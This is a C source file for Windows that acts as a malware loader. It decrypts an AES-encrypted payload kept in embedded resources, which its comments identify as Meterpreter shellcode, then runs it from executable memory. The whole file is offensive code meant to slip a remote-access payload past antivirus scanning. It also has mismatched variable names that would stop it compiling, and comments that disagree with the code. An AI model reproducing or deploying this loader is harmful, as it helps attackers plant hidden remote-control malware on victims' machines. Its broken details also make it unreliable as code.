#include <wincrypt.h>
#include <stdio.h>
#include <windows.h>

#pragma comment (lib, "crypt32.lib")

#define IDI_BIN1 102
#define IDI_BIN2 103

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return;
    }

    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


int main()
{
        // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
        // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
        HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDI_BIN1), "BIN1");
        DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
        HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

        HRSRC keyResource = FindResource(NULL, MAKEINTRESOURCE(IDI_BIN2), "BIN2");
        DWORD keySize = SizeofResource(NULL, keyResource);
        HGLOBAL keyResouceData = LoadResource(NULL, keyResource);

        DecryptAES((char*)shellcodeResourceData, shellcodeSize, (char*)keyResourceData, keySize);

        void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shellcodeResouceData, shellcodeSize);
        ((void(*)())exec)();

        return  0;
}
